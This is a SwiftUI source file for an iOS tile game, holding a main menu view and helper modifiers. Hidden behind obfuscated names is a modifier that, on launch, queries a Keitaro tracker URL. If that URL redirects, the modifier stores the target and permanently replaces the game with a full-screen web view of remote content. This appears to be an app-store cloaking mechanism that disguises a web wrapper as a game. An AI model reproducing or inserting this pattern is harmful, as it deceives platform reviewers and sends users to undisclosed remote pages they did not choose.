//
//  MenierView.swift
//  EgyptBookOfTiles
//
//  Created by Nicolae Chivriga on 20/12/2024.
//

import SwiftUI
import StoreKit


struct MenierView: View {
    @Environment(\.requestReview) var stars
    var body: some View {
        ZStack {
            Image("bg")
            .resizable()
            .ignoresSafeArea()
            
            VStack {
                Image("logotips")
                    .resizable()
                    .scaledToFit()
                VStack(spacing: 22) {
                    NavigationLink {
                        GameView()
                    } label: {
                        Image("purpl")
                        
                            .overlay {
                                Text("PLAY")
                                    .font(.system(size: 40, weight: .bold, design: .monospaced))
                                    .foregroundStyle(.white)
                            }
                    }
                    
                    
                    NavigationLink {
                        RulesView()
                    } label: {
                        Image("grin")
                        
                            .overlay {
                                Text("RULES")
                                    .font(.system(size: 40, weight: .bold, design: .monospaced))
                                    .foregroundStyle(.white)
                            }
                    }
                    
                    
                    Button {
                        stars()
                    } label: {
                        Image("torq")
                        
                            .overlay {
                                Text("STARS")
                                    .font(.system(size: 40, weight: .bold, design: .monospaced))
                                    .foregroundStyle(.white)
                            }
                    }
                }
                .padding(.top, 80)

                    
                

             Spacer()
            }
            .padding(.vertical)
        }
        .navigationBarBackButtonHidden()
    }
}
extension View {
    func fixlibhjesde() -> some View {
        self.modifier(loogeispagoeaw())
    }
    
    
    @ViewBuilder
    func yesMo(orientation: UIInterfaceOrientationMask) -> some View {
        self.onAppear() {
            AppDelegate.eroskei = orientation
        }
        // Reset orientation to previous setting
        let currentOrientation = AppDelegate.eroskei
        self.onDisappear() {
            AppDelegate.eroskei = currentOrientation
        }
    }
    
}

struct SwipeToDismissModifier: ViewModifier {
    var onDismiss: () -> Void
    @State private var offset: CGSize = .zero

    func body(content: Content) -> some View {
        content
//            .offset(x: offset.width)
            .animation(.interactiveSpring(), value: offset)
            .simultaneousGesture(
                DragGesture()
                    .onChanged { value in
                                      self.offset = value.translation
                                  }
                                  .onEnded { value in
                                      if value.translation.width > 70 {
                                          onDismiss()
                                          print("Swiped from left to right")
                                      }
                                      self.offset = .zero
                                  }
            )
    }
}
import WebKit
struct loogeispagoeaw: ViewModifier {
    
//    @StateObject private var loadingViewModel: LoadingViewModel = LoadingViewModel.shared
    @State var webView: WKWebView = WKWebView()
    @AppStorage("adapt") var hleras: URL?

    @State var isLoading: Bool = true

    
    
    func body(content: Content) -> some View {
        ZStack {
            if !isLoading {
                if hleras != nil {
                    VStack(spacing: 0) {
                        WKWebViewRepresentable(url: hleras!, webView: webView)
                        HStack {
                            Button(action: {
                                webView.goBack()
                            }, label: {
                                Image(systemName: "chevron.left")
                                
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 20, height: 20) // Customize image size
                                    .foregroundColor(.white)
                            })
                            .offset(x: 10)
                            
                            Spacer()
                            
                            Button(action: {
                                
                                webView.load(URLRequest(url: hleras!))
                            }, label: {
                                Image(systemName: "house.fill")
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 24, height: 24)                                                                       .foregroundColor(.white)
                            })
                            .offset(x: -10)
                            
                        }
                        //                    .frame(height: 50)
                        .padding(.horizontal)
                        .padding(.top)
                        .padding(.bottom, 15)
                        .background(Color.black)
                    }
                    .onAppear() {
                       
                        
                        AppDelegate.eroskei = .all
                    }
                    .modifier(SwipeToDismissModifier(onDismiss: {
                        webView.goBack()
                    }))
                    
                    
                } else {
                    content
                }
            } else {
                SpecialLoadingView()
            }
        }

//        .yesMo(orientation: .all)
        .onAppear() {
            if hleras == nil {
                reframeGse()
            } else {
                isLoading = false
            }
        }
    }
    func reframeGse() {
        guard let url = URL(string: "https://keitaro.lbdev3.ru/9qfdQY") else {
            DispatchQueue.main.async {
                self.isLoading = false
            }
            print("Invalid URL")
            return
        }

        let request = URLRequest(url: url)
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            guard let data = data, let httpResponse = response as? HTTPURLResponse, error == nil else {
                print("Error: \(error?.localizedDescription ?? "Unknown error")")
                DispatchQueue.main.async {
                    self.isLoading = false
                }
                return
            }
            
            
            if let finalURL = httpResponse.url, finalURL != url {
                print("Redirected to: \(finalURL)")
                self.hleras = finalURL
                DispatchQueue.main.async {
                    self.isLoading = false
                }
            } else {
                DispatchQueue.main.async {
                    self.isLoading = false
                }
            }
            
            if httpResponse.statusCode == 200, let adaptfe = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
                    print("Response Body: \(adaptfe)")
                  
                }
            } else {
                DispatchQueue.main.async {
                    print("Request failed with status code: \(httpResponse.statusCode)")
                    DispatchQueue.main.async {
 self.isLoading = false
                    }
                }
            }
        }.resume()
    }
}
struct SpecialLoadingView: View {
    @State private var animationOffset: CGFloat = -50
    @State private var isAnimating = false
    
    var body: some View {
        ZStack {
            Color.white
        }
        .onAppear {
            animationOffset = 50
            isAnimating = true
        }
    }
    private func randomColor() -> Color {
            Color(
                red: .random(in: 0.4...1),
                green: .random(in: 0.4...1),
                blue: .random(in: 0.4...1)
            )
        }
    
}
